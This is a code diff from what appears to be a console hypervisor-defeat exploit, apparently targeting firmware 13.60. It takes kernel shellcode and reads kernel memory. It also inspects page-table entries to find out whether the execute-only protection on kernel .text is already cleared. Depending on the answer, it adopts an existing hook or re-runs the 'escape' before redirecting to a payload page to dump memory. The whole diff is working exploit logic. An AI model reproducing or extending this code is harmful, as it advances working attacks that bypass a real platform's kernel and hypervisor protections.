@@ -780,18 +780,24 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
 #endif
 
   if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
-    /* The hook is already installed in this boot -- typically by another payload
-     * that armed it and did not survive rest mode (e.g. Byepervisor-Reborn,
-     * which uses the same cave offsets, magic and cookie). Its chain writes the
-     * cookie to the same deterministic oracle and its resume redirect points at
-     * the same payload page, so adopt that state instead of returning inert
-     * (which would leave g_armed == 0 and produce no post-resume dump). */
-    g_oracle = cave_addr + KH_OFF_USER;
-    g_payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
-    g_armed = 1;
-    g_redirected = 1;
-    notify("13.60: hook already armed (state survived); adopting it.\n");
-    return 0;
+    /* Adopt an already-armed state ONLY if the escape is actually still in
+     * effect (XOTEXT clear on the .text PTE). A stale 'KHOOKED.' mark with
+     * .text still execute-only means the escape never ran in this boot; the
+     * armed state is then worthless (its chain's page tables are gone) and
+     * adopting it would skip the escape and produce an empty dump. */
+    uint64_t e = 0;
+    uint64_t pm = kdlsym(KERNEL_SYM_PMAP_STORE);
+    int text_open = (find_pte(pm, ktext, &e) != 0xFFFFFFFFFFFFFFFFull) &&
+                    (PDE_FIELD(e, XOTEXT) == 0);
+    if (text_open) {
+      g_oracle = cave_addr + KH_OFF_USER;
+      g_payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
+      g_armed = 1;
+      g_redirected = 1;
+      notify("13.60: hook armed and .text already open; adopting it.\n");
+      return 0;
+    }
+    notify("13.60: stale armed mark (.text still execute-only); running escape.\n");
   }
 
 #if PL5_DIAG == 0
